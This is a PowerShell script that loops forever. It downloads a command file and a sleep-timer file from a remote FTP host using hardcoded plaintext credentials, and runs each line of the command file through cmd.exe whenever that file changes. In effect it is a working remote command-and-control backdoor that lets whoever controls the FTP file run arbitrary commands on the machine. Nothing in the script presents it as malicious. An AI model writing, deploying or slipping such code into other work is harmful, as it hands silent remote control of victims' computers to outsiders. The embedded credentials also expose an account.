# Initialize a variable to store the previous hash
$previousHash = $null

# Set the FTP URL and local file name
$ftpUrl = "ftp://ftpupload.net/input.txt" 
$timerUrl = "ftp://ftpupload.net/timer.txt" 
$localFileName = "online_commands.txt"
$timerFileName = "timer.txt"  # Add the timer file name

# Set FTP credentials
$ftpUsername = "b4_35142607"
$ftpPassword = "Saurabh@123"

# Loop indefinitely
    while ($true) {

     # Fetch the online timer value
     # Download the timer value using Invoke-WebRequest with FTP
        Invoke-WebRequest -Uri $timerUrl -OutFile $timerFileName -Credential (New-Object System.Management.Automation.PSCredential($ftpUsername, (ConvertTo-SecureString $ftpPassword -AsPlainText -Force))) -UseBasicParsing

     # Fetch the online text
     # Download the file using Invoke-WebRequest with FTP
        Invoke-WebRequest -Uri $ftpUrl -OutFile $localFileName -Credential (New-Object System.Management.Automation.PSCredential($ftpUsername, (ConvertTo-SecureString $ftpPassword -AsPlainText -Force))) -UseBasicParsing


    # Calculate the hash of the current content
    $currentHash = Get-FileHash -Path 'online_commands.txt' -Algorithm SHA256 | Select-Object -ExpandProperty Hash

    # Check if the hash has changed (indicating a change in content)
    if ($currentHash -ne $previousHash) {
        # Store the current hash as the previous hash
        $previousHash = $currentHash

        # Check if online_commands.txt has any commands and process them.
        if (Test-Path -Path 'online_commands.txt') {
            Get-Content -Path 'online_commands.txt' | ForEach-Object {
                # Output the received command for debugging
                Write-Host "Executing command: $_"
                
                # Execute the received command in a new Command Prompt window and pause after execution.
                Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $_"
            }
            
            # Delete the online_commands.txt file after processing.
            Remove-Item -Path 'online_commands.txt'
        }
    }

    # Sleep for a few seconds before checking for updates again.
    # Read the integer value from the file
    $intValue = Get-Content $timerFileName | Out-String | ForEach-Object { [int]$_ }

    # Check if the value is indeed an integer
    if ($intValue -is [int]) {
        Write-Host "Sleeping for $intValue seconds."
        Start-Sleep -Seconds $intValue
    } else {
        Write-Host "The content of $timerFileName is not a valid integer."
    }
}